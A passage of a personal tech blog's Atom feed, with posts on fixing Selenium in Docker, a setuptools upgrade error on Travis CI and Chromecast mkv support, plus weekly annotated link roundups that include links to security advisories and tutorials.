&lt;li&gt;&lt;a href="https://github.com/blackjk3/react-form-builder/issues/11#issuecomment-319307464"&gt;https://github.com/blackjk3/react-form-builder/issues/11#issuecomment-319307464&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Node.js"></category><category term="node-gyp"></category></entry><entry><title>Selenium in Docker got "Operation not permitted" error</title><link href="https://blog.m157q.tw/posts/2017/08/28/selenium-in-docker-got-operation-not-permitted-error/" rel="alternate"></link><published>2017-09-19T12:51:40+08:00</published><updated>2017-09-19T12:51:40+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-28:posts/2017/08/28/selenium-in-docker-got-operation-not-permitted-error/</id><summary type="html">&lt;h2&gt;Solutions&lt;/h2&gt;
&lt;p&gt;Just choose one of the solutions below.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;For Docker&lt;/h4&gt;
&lt;p&gt;Add &lt;code&gt;--cap-add SYS_ADMIN&lt;/code&gt; for &lt;code&gt;docker run&lt;/code&gt; to gain the permission  &lt;/p&gt;
&lt;p&gt;For example:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker run -it &lt;span class="se"&gt;\ &lt;/span&gt; 
             --cap-add&lt;span class="o"&gt;=&lt;/span&gt;SYS_ADMIN &lt;span class="se"&gt;\ &lt;/span&gt; 
             -e &lt;span class="nv"&gt;PYTHONPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;container_work_dir&lt;span class="k"&gt;)&lt;/span&gt;  
             -p &lt;span class="k"&gt;$(&lt;/span&gt;site_port_mapping&lt;span class="k"&gt;)&lt;/span&gt;  
             -p &lt;span class="k"&gt;$(&lt;/span&gt;admin_port_mapping&lt;span class="k"&gt;)&lt;/span&gt;  
             -p &lt;span class="k"&gt;$(&lt;/span&gt;https_port_mapping&lt;span class="k"&gt;)&lt;/span&gt;  
             -w &lt;span class="k"&gt;$(&lt;/span&gt;container_work_dir&lt;span class="k"&gt;)&lt;/span&gt;  
             --name &lt;span class="k"&gt;$(&lt;/span&gt;project_name&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h4&gt;For Selenium&lt;/h4&gt;
&lt;p&gt;Add &lt;code&gt;--no-sandbox&lt;/code&gt; while launching Chrome driver  &lt;/p&gt;
&lt;p&gt;For example:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;selenium&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;webdriver&lt;/span&gt;  

&lt;span class="n"&gt;chrome_options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;webdriver&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ChromeOptions&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;chrome_options&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;--no-sandbox&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;chrome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;webdriver&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Chrome&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chrome_options&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;chrome_options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jessfraz/dockerfiles/issues/65"&gt;https://github.com/jessfraz/dockerfiles/issues/65&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/43665276/how-to-run-google-chrome-headless-in-docker"&gt;https://stackoverflow.com/questions/43665276/how-to-run-google-chrome-headless-in-docker&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jessfraz/dockerfiles/issues/17"&gt;https://github.com/jessfraz/dockerfiles/issues/17&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/SeleniumHQ/docker-selenium/issues/383"&gt;https://github.com/SeleniumHQ/docker-selenium/issues/383&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/elgalu/docker-selenium/issues/58"&gt;https://github.com/elgalu/docker-selenium/issues/58&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Chatie/wechaty/commit/e68483833f85cfc59879da0daf62f275a0ef9db8"&gt;https://github.com/Chatie/wechaty/commit/e68483833f85cfc59879da0daf62f275a0ef9db8&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Docker"></category><category term="Selenium"></category></entry><entry><title>Y2017W34</title><link href="https://blog.m157q.tw/posts/2017/08/28/y2017w34/" rel="alternate"></link><published>2017-10-19T03:03:37+08:00</published><updated>2017-10-19T03:03:37+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-08-28:posts/2017/08/28/y2017w34/</id><summary type="html">&lt;h3&gt;ai&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/p/25928551"&gt;用深度学习（CNN RNN Attention）解决大规模文本分类问题 - 综述和实践 - 知乎专栏&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jmlr.org/papers/volume3/bengio03a/bengio03a.pdf"&gt;A Neural Probabilistic Language Model&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;curl&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/7172784/how-to-post-json-data-with-curl-from-terminal-commandline-to-test-spring-rest"&gt;How to POST JSON data with Curl from Terminal/Commandline to Test Spring REST? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;devops&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackshare.io/circleci/how-circleci-processes-4-5-million-builds-per-month"&gt;How CircleCI Processes 4.5 Million Builds Per Month - | StackShare&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.golang.org/go1.9"&gt;Go 1.9 is released - The Go Blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://githubengineering.com/kubernetes-at-github/"&gt;Kubernetes at GitHub | GitHub Engineering&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pymotw.com/3/smtpd/"&gt;smtpd — Sample Mail Servers — PyMOTW 3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://eev.ee/blog/2016/11/23/a-rebuttal-for-python-3/"&gt;A Rebuttal For Python 3 / fuzzy notepad&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Zed Shaw, of Learn Python the Hard Way fame, has now written The Case Against Python 3.  I’m not involved with core Python development. The only skin I have in this game is that I like Python 3. It’s a good language.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;整篇都在為 Python 3 平反，狂打臉 Learn Python the Hard Way 的作者。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/QQuick/Transcrypt"&gt;GitHub - QQuick/Transcrypt: Python 3.6 to JavaScript compiler - Lean, fast, open! ---&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Operator &lt;strong&gt;= added, a &lt;/strong&gt;= b converted to a = a ** b Operator @= added, M3 @= M2 converted to M3 = M3 @ M2, same as for other augmented assignment ops Compilation error report now contains detailed import sequence Enhancement for issue #281: tup  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://36kr.com/p/5089671.html"&gt;嫌 Python 太慢？并行运算 Process Pools 三行代码给你 4 倍提速！_36 氪&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;import concurrent.futures&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;with concurrent.futures.ProcessPoolExecutor() as executor:&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;executor.map(func, args)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Python 3 才有，有認識的人表示因為這個 library 真的太棒了，公司原本用 Python 2 的程式碼為了要用這個函式庫，特地改寫成 Python 3。  &lt;/li&gt;
&lt;li&gt;在&lt;a href="https://weekly.codetengu.com/issues/76#vinta"&gt;碼天狗第 76 期&lt;/a&gt;也有被介紹過，是個可以讓 concurrent 變得像寫一般的 for loop 一樣輕鬆簡單的 library。  &lt;ul&gt;
&lt;li&gt;原文：&lt;a href="https://vinta.ws/code/parallel-tasks-in-python-concurrent-futures.html"&gt;https://vinta.ws/code/parallel-tasks-in-python-concurrent-futures.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原文：&lt;a href="https://medium.com/@ageitgey/quick-tip-speed-up-your-python-data-processing-scripts-with-process-pools-cf275350163a"&gt;https://medium.com/@ageitgey/quick-tip-speed-up-your-python-data-processing-scripts-with-process-pools-cf275350163a&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/glob.html"&gt;11.7. glob — Unix style pathname pattern expansion — Python 3.6.2 documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The glob module finds all the pathnames matching a specified pattern according to the rules used by the Unix shell, although results are returned in arbitrary order. No tilde expansion is done, but *, ?, and character ranges expressed with [] will be correctly matched. This is done by using the os.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;簡單來說就是在 Python 用 UNIX 的 file path pattern expansion，像是 &lt;code&gt;*&lt;/code&gt;, &lt;code&gt;**/*&lt;/code&gt; 等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/9449101/how-to-stop-flask-from-initialising-twice-in-debug-mode"&gt;python - How to stop Flask from initialising twice in Debug Mode? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;When building a Flask service in Python and setting the debug mode on, the Flask service will initialise twice. When the initialisation loads caches and the like, this can take a while. Having to do this twice is annoying when in development (debug) mode.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/ssuserd44fa2/ss-79172936"&gt;滲透測試基本技巧與經驗分享&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;BambooFox 的學弟在 HITCON CMT 2017 講的議程，投影片做得挺充實且易懂的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://morpheuzblog.wordpress.com/2015/11/18/bof/"&gt;bof – Blog of Morpheuz&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是簡單易懂的 bof pwn 的教學。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/08/25/formosat"&gt;一波三折的台灣太空夢：福衛五號發射成功，那你知道還有福衛一到七號、蕃薯號嗎？ - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;福衛五號將於 25 日凌晨 2 時 50 分發射升空，為台灣自製衛星立下重要里程碑，台灣衛星史除了已除役的福衛一號、二號，服役中的福衛三號外，還有計畫終止的福衛四號及福衛六號。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="ai"></category><category term="curl"></category><category term="devops"></category><category term="golang"></category><category term="github"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category></entry><entry><title>setuptools 36.2.0 upgrading/downgrading uninstall rollback error with Python 3.6.2 on Travis CI</title><link href="https://blog.m157q.tw/posts/2017/08/27/setuptools-36-2-0-upgrading-downgrading-uninstall-rollback-error-with-python-3-6-2-on-travis-ci/" rel="alternate"></link><published>2017-08-27T18:12:22+08:00</published><updated>2017-08-27T18:12:22+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-27:posts/2017/08/27/setuptools-36-2-0-upgrading-downgrading-uninstall-rollback-error-with-python-3-6-2-on-travis-ci/</id><summary type="html">&lt;blockquote&gt;
&lt;p&gt;TL;DR: Just &lt;code&gt;pip install -U setuptools&lt;/code&gt; before the package which depends on &lt;code&gt;setuptools&lt;/code&gt; upgrade it.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;A build on Travis CI of one of my side projects got error &lt;code&gt;AttributeError: 'Distribution' object has no attribute 'install_requires'&lt;/code&gt; while upgrading setuptools from 36.2.0 to 36.7.0 with Python 3.6.2 build job. This build also has Python 3.4 and Python 3.5 build jobs which have no erorr because they didn't need to upgrade &lt;code&gt;setuptools&lt;/code&gt;.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;What's the problem&lt;/h2&gt;
&lt;p&gt;Travis CI image with &lt;code&gt;os: linux&lt;/code&gt; and &lt;code&gt;python: 3.6&lt;/code&gt; labels default installed &lt;code&gt;Python 3.6.2&lt;/code&gt;, &lt;code&gt;pip 9.0.1&lt;/code&gt; and &lt;code&gt;setuptools 36.2.0&lt;/code&gt; in this time. The problem occured while &lt;code&gt;pip install -U pytest&lt;/code&gt; was running because the default &lt;code&gt;--upgrade-strategy&lt;/code&gt; of &lt;code&gt;-U / --upgrade&lt;/code&gt; option of &lt;code&gt;pip&lt;/code&gt; is &lt;code&gt;"eager"&lt;/code&gt; which will upgrade all dependent packages to newest version.  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;See part of &lt;code&gt;pip install -h&lt;/code&gt; for detail:&lt;br /&gt;
&lt;code&gt;-U, --upgrade               Upgrade all specified packages to the newest available version.  
                              The handling of dependencies depends on the upgrade-strategy  
                              used.  
  --upgrade-strategy &amp;lt;upgrade_strategy&amp;gt;  
                              Determines how dependency upgrading should be handled. "eager"  
                              - dependencies are upgraded regardless of whether the currently  
                              installed version satisfies the requirements of the upgraded  
                              package(s). "only-if-needed" -  are upgraded only when they do  
                              not satisfy the requirements of the upgraded package(s).&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This made &lt;code&gt;pip install -U pytest&lt;/code&gt; upgrade &lt;code&gt;setuptools&lt;/code&gt; from 36.2.0 to 36.7.0 while installing &lt;code&gt;pytest-3.2.1&lt;/code&gt; and got the error below:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Found existing installation: setuptools 36.2.0  
    Uninstalling setuptools-36.2.0:  
      Successfully uninstalled setuptools-36.2.0  
  Rolling back uninstall of setuptools  
Exception:  
Traceback (most recent call last):  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/basecommand.py&amp;quot;, line 215, in main  
    status = self.run(options, args)  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/commands/install.py&amp;quot;, line 342, in run  
    prefix=options.prefix_path,  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/req/req_set.py&amp;quot;, line 784, in install  
    **kwargs  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/req/req_install.py&amp;quot;, line 851, in install  
    self.move_wheel_files(self.source_dir, root=root, prefix=prefix)  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/req/req_install.py&amp;quot;, line 1064, in move_wheel_files  
    isolated=self.isolated,  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/wheel.py&amp;quot;, line 247, in move_wheel_files  
    prefix=prefix,  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/locations.py&amp;quot;, line 140, in distutils_scheme  
    d = Distribution(dist_args)  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/setuptools/dist.py&amp;quot;, line 365, in __init__  
    self._finalize_requires()  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/setuptools/dist.py&amp;quot;, line 372, in _finalize_requires  
    if not self.install_requires:  
AttributeError: &amp;#39;Distribution&amp;#39; object has no attribute &amp;#39;install_requires&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;How to fix it&lt;/h2&gt;
&lt;p&gt;Although there are many comments on &lt;a href="https://github.com/pypa/setuptools/issues/1086"&gt;pypa/setuptools #1086&lt;/a&gt; and &lt;a href="https://github.com/pypa/setuptools/issues/1101"&gt;pypa/setuptools #1101&lt;/a&gt;, I didn't know the exact reason after I read them. But after a little digging on the GitHub, I finally got some clues.  &lt;/p&gt;
&lt;p&gt;This problem had already been fixed in &lt;a href="https://github.com/pypa/setuptools/pull/1089"&gt;pypa/setuptools #1089&lt;/a&gt;, but why I still got this problem? Because this fix is &lt;a href="https://github.com/pypa/setuptools/blob/ac7a33c84d74afd3b7453bd880943be9cb4c5787/setuptools/dist.py"&gt;in setuptools-36.2.1&lt;/a&gt; not in &lt;a href="https://github.com/pypa/setuptools/blob/1eec02038d28506a42bc45d14ef2d54b136cc8bc/setuptools/dist.py"&gt;setuptools-36.2.0&lt;/a&gt;, if you use &lt;code&gt;setuptools-36.2.0&lt;/code&gt; you will still encounter this problem.  &lt;/p&gt;
&lt;p&gt;Here's &lt;a href="https://github.com/labgrid-project/labgrid/pull/119/files"&gt;a workarond for this problem&lt;/a&gt; which is same as the TL;DR, just &lt;code&gt;pip install --upgrade setuptools&lt;/code&gt; to upgrade it.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Further Discussion&lt;/h2&gt;
&lt;p&gt;But why? why &lt;code&gt;pip install --upgrade setuptools&lt;/code&gt; works? why &lt;code&gt;pip install -U pytest&lt;/code&gt; doesn't? Aren't these two methods just remove &lt;code&gt;setuptools-36.2.0&lt;/code&gt; and install a newer &lt;code&gt;setuptools&lt;/code&gt;? According to the result, it's not.  &lt;/p&gt;
&lt;p&gt;I guess I might have to spend some time on figuring the workflow of &lt;code&gt;pip&lt;/code&gt;?  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/45307110/pip-is-rolling-back-uninstall-of-setuptools"&gt;https://stackoverflow.com/questions/45307110/pip-is-rolling-back-uninstall-of-setuptools&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pypa/setuptools/issues/1086"&gt;https://github.com/pypa/setuptools/issues/1086&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pypa/setuptools/issues/1101"&gt;https://github.com/pypa/setuptools/issues/1101&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pypa/setuptools/pull/1089"&gt;https://github.com/pypa/setuptools/pull/1089&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Travis CI"></category><category term="Python"></category><category term="setuptools"></category></entry><entry><title>Y2017W33</title><link href="https://blog.m157q.tw/posts/2017/08/22/y2017w33/" rel="alternate"></link><published>2017-10-17T21:30:13+08:00</published><updated>2017-10-17T21:30:13+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-08-22:posts/2017/08/22/y2017w33/</id><summary type="html">&lt;h3&gt;ai&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/junyanz/pytorch-CycleGAN-and-pix2pix"&gt;GitHub - junyanz/pytorch-CycleGAN-and-pix2pix: Image-to-image translation in PyTorch (e.g. horse2zebra, edges2cats, and more)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This is our ongoing PyTorch implementation for both unpaired and paired image-to-image translation. Check out the original CycleGAN Torch and pix2pix Torch if you would like to reproduce the exact same results in the paper.  The code was written by Jun-Yan Zhu and Taesung Park.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;又是一個 GAN 的應用，可以把一般的馬轉成斑馬，也可以把斑馬轉成一般的馬，還有很多 feature 可以互轉，因為可以互轉所以叫 CycleGAN。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/p/28488946"&gt;AI可能真的要代替插画师了…… - 知乎专栏&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://36kr.com/p/5088189.html?ktm_source=feed"&gt;学习周伯通左右手打架的 GANs，还有十大神奇应用_36 氪&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/tw_dsconf/ss-78795326"&gt;[系列活動] 一日搞懂生成式對抗網路&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/p/28495599?from=groupmessage&amp;amp;isappinstalled=0"&gt;在台湾参加前端大会是什么体验？ - 知乎专栏&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;又一篇  &lt;/li&gt;
&lt;li&gt;大家好好檢討檢討  &lt;/li&gt;
&lt;li&gt;為什麼前端大會沒人講網站後端跟架構  &lt;/li&gt;
&lt;li&gt;嗯  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://mp.weixin.qq.com/s/GSBQA8To7u64OfaY6yGqZQ"&gt;台湾技术交流见闻与感想&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ffmpeg&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://askubuntu.com/questions/352920/fastest-way-to-convert-videos-batch-or-single"&gt;ffmpeg - Fastest way to convert videos (batch or single)? - Ask Ubuntu&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;graphql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/graphql-python/graphene-django"&gt;graphql-python/graphene-django: Graphene Django integration&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.byvoid.com/zht/blog/googles-ideological-echo-chamber"&gt;Google的意識形態迴音室 - BYVoid&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看來這篇應該就是前陣子 Google 員工發的那篇鬧的沸沸揚揚的文章的中文翻譯版了吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dev.to/rogerjin12/top-10-books-every-cto-should-read"&gt;Top 10 Books Every CTO Should Read&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;都是管理類的書籍呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.mz026.rocks/20170812/did-you-code-review-today"&gt;你今天 code review 了嗎？ – mz026's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是跟我自己目前在公司的經驗差不多  &lt;/li&gt;
&lt;li&gt;覺得最重要的還是把 PR 切得夠小這件事  &lt;/li&gt;
&lt;li&gt;不然真的會讓人很不想 review  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hellolynn.hpd.io/2017/08/03/%e5%bf%ab%e9%80%9f%e6%8e%92%e5%ba%8f-quick-sort/"&gt;快速排序 (Quick Sort) – 寫點科普，請給指教。&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;複習一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pymotw.com/3/statistics/"&gt;statistics — Statistical Calculations — PyMOTW 3&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來有這內建的函式庫  &lt;/li&gt;
&lt;li&gt;感覺大家應該都直接裝其他科學計算功能比較齊全的第三方函式庫了吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/tw_dsconf/python-78691041"&gt;[系列活動] Python 爬蟲實戰&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/tw_dsconf/python-78651480"&gt;[系列活動] Python 程式語言起步走&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugzilla.redhat.com/show_bug.cgi?id=1480386"&gt;Bug 1480386 – CVE-2017-1000117 git: Command injection via malicious ssh URLs&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;lag 了幾天 有個 PoC 有趣  &lt;/li&gt;
&lt;li&gt;https://t.co/milfQzPJPd  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://public-inbox.org/git/xmqqh8xf482j.fsf@gitster.mtv.corp.google.com/T/#u"&gt;[ANNOUNCE] Git v2.14.1, v2.13.5, and others&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.recurity-labs.com/2017-08-10/scm-vulns"&gt;Compromise On Checkout - Vulnerabilities in SCM Tools · The Recurity Lablog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/greymd/CVE-2017-1000117"&gt;greymd/CVE-2017-1000117&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;selenium&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/32953498/how-can-i-remove-notifications-and-alerts-from-browser-selenium-python-2-7-7"&gt;how can i remove notifications and alerts from browser? selenium python 2.7.7 - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/casschin/1990245"&gt;Python webdriver api quick sheet&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://msdn.microsoft.com/en-us/library/ms256086(v=vs.110).aspx"&gt;XPath Examples&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mhperng.blogspot.tw/2017/08/blog-post_17.html"&gt;清大彭明輝的部落格: 媒體自律與民主政治的昏迷指數&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/08/news-methanol-alcoholism-wine-save-life-2017/amp/"&gt;新聞：陸男誤喝甲醇中毒 醫生繼續灌白酒來救命 - Tsung's Blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="ai"></category><category term="blog"></category><category term="ffmpeg"></category><category term="graphql"></category><category term="life"></category><category term="programmer"></category><category term="programming"></category><category term="python"></category><category term="security"></category><category term="selenium"></category><category term="web"></category></entry><entry><title>原來 Chromecast</title><link href="https://blog.m157q.tw/posts/2017/08/15/so-this-is-chromecast/" rel="alternate"></link><published>2018-01-15T16:07:26+08:00</published><updated>2018-01-15T16:07:26+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-15:posts/2017/08/15/so-this-is-chromecast/</id><summary type="html">&lt;p&gt;原來 Chromecast 不支援 mkv&lt;br /&gt;
可播但沒聲音  &lt;/p&gt;
&lt;p&gt;ref: &lt;a href="https://developers.google.com/cast/docs/media#media-container-formats"&gt;https://developers.google.com/cast/docs/media#media-container-formats&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
